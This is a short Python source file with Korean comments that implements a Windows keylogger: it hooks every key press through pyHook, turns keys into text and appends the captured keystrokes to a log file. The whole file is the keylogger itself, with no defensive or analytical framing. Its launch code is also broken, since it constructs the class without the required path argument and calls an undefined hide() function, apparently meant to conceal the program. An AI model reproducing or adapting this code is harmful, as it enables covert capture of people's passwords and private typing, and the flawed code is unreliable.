import pyHook
import pythoncom

class keyLogger:

    def __init__(self,path):
        self.data = ''
        self.path = path # 경로를 입력 받음

    def keypressed(self,event): #키보드 입력
        if event.Ascii==13:
            keys='<ENTER>' #엔터
        elif event.Ascii==8:
            keys='<BACKSPACE>' #백스페이스
        elif event.Ascii==9:
            keys='<TAB>' #탭
        else:
            keys=chr(event.Ascii) #그 외는 문자
        self.data=self.data+keys #data에 keys 값을 넘겨줌
        self.local()

    def local(self):
        if len(self.data)>5: #데이터 길이가 5보다 크면
            fp=open(self.path,"a") #파일만들고 데이터 입력 후에 파일 닫기
            fp.write(self.data)
            fp.close()
            self.data=''

    def run(self):
        obj = pyHook.HookManager() #Hookmanager
        obj.KeyDown = self.keypressed #키입력
        obj.HookKeyboard() #키보드
        pythoncom.PumpMessages()

if __name__ == '__main__':
    keyLogger().run() #키로거 
    hide()
